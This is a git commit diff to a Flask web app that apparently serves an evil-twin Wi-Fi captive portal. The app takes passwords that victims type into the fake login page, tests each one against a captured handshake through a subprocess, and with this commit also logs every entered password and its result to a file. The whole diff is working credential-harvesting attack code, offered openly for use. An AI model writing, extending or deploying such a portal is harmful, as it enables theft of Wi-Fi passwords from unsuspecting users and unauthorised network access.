bc422010ecbbedfe9f05ca673ff07882ceec4a1c
Mikhail Gaile <michael2ga3@gmail.com>
2024-11-13 23:22:55 +0300

    No time to commit.. My people need me!

--- wifi/evil-twin-opn/web/app.py
+++ wifi/evil-twin-opn/web/app.py
@@ -7,6 +7,9 @@ app = Flask(__name__)
 is_debug = len(sys.argv) != 3
 bssid = str(sys.argv[1])
 
+wordlist_file = open("wordlist.txt", "w")
+results_file = open("results.txt", "a")
+
 
 # android: generate_204 gen_204
 # ios: /hotspot-detect.html
@@ -20,8 +23,10 @@ def check_password():
     data = request.get_json()
     entered_password = data.get("password")
 
-    with open("wordlist.txt", "w") as f:
-        f.write(entered_password + "\n")
+    wordlist_file.seek(0)
+    wordlist_file.truncate()
+    wordlist_file.write(entered_password + "\n")
+    wordlist_file.flush()
 
     try:
         result = subprocess.run(
@@ -39,10 +44,13 @@ def check_password():
         )
         output = result.stdout.decode()
         print(output)
-        if "KEY FOUND!" in output:
-            return "OK"
-        return "KO"
+        result = "OK" if "KEY FOUND!" in output else "KO"
+        results_file.write(f"{result}: {entered_password}\n")
+        results_file.flush()
+        return result
     except subprocess.TimeoutExpired:
+        results_file.write(f"TI: {entered_password}\n")
+        results_file.flush()
         return "KO"
 
 
@@ -51,9 +59,17 @@ def index():
     return render_template("index.html")
 
 
+def cleanup():
+    wordlist_file.close()
+    results_file.close()
+
+
 if __name__ == "__main__":
-    app.run(
-        debug=is_debug,
-        host="127.0.0.1" if is_debug else str(sys.argv[2]),
-        port=5000 if is_debug else 80,
-    )
+    try:
+        app.run(
+            debug=is_debug,
+            host="127.0.0.1" if is_debug else str(sys.argv[2]),
+            port=5000 if is_debug else 80,
+        )
+    finally:
+        cleanup()
